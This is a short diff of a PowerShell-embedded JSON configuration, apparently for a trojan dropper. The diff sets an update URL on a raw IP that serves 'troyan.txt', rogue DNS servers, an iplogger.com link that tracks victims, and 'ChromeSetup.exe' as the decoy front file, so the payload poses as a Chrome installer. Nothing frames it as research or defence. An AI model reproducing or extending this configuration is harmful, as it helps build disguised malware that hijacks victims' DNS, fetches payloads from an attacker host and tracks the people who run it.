@@ -1,14 +1,14 @@
 $server = '{
     "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
-    "updateUrl":  "http://data-http://1.superhost.pw//d-data/troyan.txt",
+    "updateUrl":  "http://109.248.201.226/d-data/troyan.txt",
     "primaryDns":  "109.248.201.226",
     "secondaryDns":  "109.248.201.224",
     "track":  false,
     "trackSerie":  "001",
-    "trackingUrl":  null,
+    "trackingUrl":  "https://iplogger.com/2zDF55",
     "trackingPost":  null,
     "trackingMethod":  "GET",
-    "trackingPreview":  "http://localhost?serie={SERIE}\u0026number={NUMBER}",
+    "trackingPreview":  "https://iplogger.com:443/2zDF55?serie=%7bSERIE%7d\u0026number=%7bNUMBER%7d",
     "trackingPreviewPost":  "{\r\n  \"serie\": \"{SERIE}\",\r\n  \"number\": \"{NUMBER}\"\r\n}",
     "autoStart":  false,
     "autoUpdate":  false,
@@ -36,7 +36,7 @@ $server = '{
 
                   ],
     "front":  [
-
+                  "ChromeSetup.exe"
               ],
     "embeddings":  [
 
